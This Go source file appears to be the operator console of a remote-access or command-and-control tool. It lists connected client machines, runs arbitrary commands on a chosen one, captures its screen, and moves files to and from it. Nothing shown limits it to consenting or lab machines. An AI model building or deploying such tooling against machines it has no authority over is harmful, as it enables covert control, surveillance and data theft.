package server

import (
	"fmt"
	"os"
	"strings"

	"github.com/abiosoft/ishell"
	"github.com/fatih/color"
)

// Shell interactive shell
func Shell() {
	shell := ishell.New()
	cwd, err := os.Getwd()
	if err != nil {
		panic(err)
	}

	shell.SetPrompt(blue(cwd) + "$ ")

	shell.AddCmd(&ishell.Cmd{
		Name: "select",
		Func: func(c *ishell.Context) {
			if len(activeClients) == 0 {
				color.HiRed("No clients yet!")
				return
			}
			choice := c.MultiChoice(listConn(), "Select client to interact with")
			client := getClient(choice)
			client.shellClient()
		},
		Help: "interact with a client",
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "list",
		Func: func(c *ishell.Context) {
			if len(activeClients) == 0 {
				color.HiRed("No clients yet!")
				return
			}
			printClients()
		},
		Help: "list all connected clients",
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "alias",
		Func: func(c *ishell.Context) {
			if len(activeClients) == 0 {
				color.HiRed("No clients yet!")
				return
			}
			choice := c.MultiChoice(listConn(), "Select client to give an alias")
			fmt.Println("Type an alias for selected client")
			name := c.ReadLine()
			client := activeClients[choice]
			client.Client.Name = name
			db.Save(&client.Client)
		},
		Help: "give a client an alias",
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "cd",
		Func: func(c *ishell.Context) {
			os.Chdir(strings.Join(c.Args, " "))
			cwd, err := os.Getwd()
			if err != nil {
				panic(err)
			}

			shell.SetPrompt(blue(cwd) + "$ ")

		},
		Help: "change the working directory of the server",
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "exit",
		Func: func(c *ishell.Context) {
			color.HiRed("exiting...")
			c.Stop()
		},
		Help: "exit the server",
	})
	shell.Run()
}

func (client activeClient) shellClient() {
	shell := ishell.New()
	cwd, err := client.runCommand("cwd", false)
	if err != nil {
		color.Red("[!] Could not get the cwd of the client!")
		return
	}
	shell.SetPrompt(blue(cwd) + "$ ")
	listdir := client.ls()
	shell.AddCmd(&ishell.Cmd{
		Name: "cd",
		Func: func(c *ishell.Context) {
			cwd, err := client.runCommand("cd "+strings.Join(c.Args, " "), false)
			if err != nil {
				color.Red("[!] Could not get cwd")
				return
			}
			shell.SetPrompt(blue(cwd) + "$ ")
			listdir = client.ls()
		},
		Completer: func([]string) []string {
			return listdir
		},
		Help: "change the working directory of the client",
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "ls",
		Func: func(c *ishell.Context) {
			list, err := client.runCommand("ls", false)
			if err != nil {
				color.HiRed("[!] Encoutered err listing dir")
				return
			}
			println(strings.Replace(list, ";", "\n", -1))
		},
		Help: "list the content of the working directory of the client",
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "screen",
		Func: func(c *ishell.Context) {
			c.ProgressBar().Indeterminate(true)
			c.ProgressBar().Start()
			err := client.getFile("screen")
			if err != nil {
				c.ProgressBar().Final(red("[!] Screenshot failed"))
				c.ProgressBar().Stop()
			}
			c.ProgressBar().Final(green("[+] Screenshot received"))
			c.ProgressBar().Stop()
		},
		Help: "take a screenshot of the client and upload it to the server",
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "down",
		Func: func(c *ishell.Context) {
			c.ProgressBar().Indeterminate(true)
			c.ProgressBar().Start()
			err := client.getFile(strings.Join(c.Args, " "))
			if err != nil {
				c.ProgressBar().Final(red("[!] Download failed"))
				c.ProgressBar().Stop()
			}
			c.ProgressBar().Final(green("[+] Download received"))
			c.ProgressBar().Stop()
		},
		Help: "download a file from the client: usage down <file>",
		Completer: func([]string) []string {
			return listdir
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "up",
		Func: func(c *ishell.Context) {
			c.ProgressBar().Indeterminate(true)
			c.ProgressBar().Start()
			err := client.sendFile(strings.Join(c.Args, " "))
			if err != nil {
				c.ProgressBar().Final(red("[!] Upload failed"))
				c.ProgressBar().Stop()
			}
			c.ProgressBar().Final(green("[+] Upload Successful"))
			c.ProgressBar().Stop()
		},
		Help: "upload a file from the cwd of the Server to cwd of the client: usage up <file>",
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "sync",
		Func: func(c *ishell.Context) {

		},
		Help: "sync with the client",
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "cat",
		Func: func(c *ishell.Context) {
			client.runCommand("cat "+strings.Join(c.Args, " "), true)
		},
		Help: "print the content of a file: usage cat <file>",
		Completer: func([]string) []string {
			return listdir
		},
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "escape",
		Func: func(c *ishell.Context) {
			client.runCommand(strings.Join(c.Args, " "), true)
		},
		Help: "escape a command and run it natively on client",
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "reconnect",
		Func: func(c *ishell.Context) {
			client.runCommand("reconnect", false)
			c.Stop()
			shell.Close()
		},
		Help: "tell the client to reconnect",
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "exit",
		Func: func(c *ishell.Context) {
			c.Stop()
			shell.Close()
		},
		Help: "background the current session",
	})
	shell.NotFound(func(c *ishell.Context) {
		client.runCommand(strings.Join(c.Args, " "), true)
	})
	shell.Run()
}

func (client activeClient) ls() []string {
	list, err := client.runCommand("ls", false)
	if err != nil {
		list = "Unknown"
	}
	return strings.Split(list, ";")
}
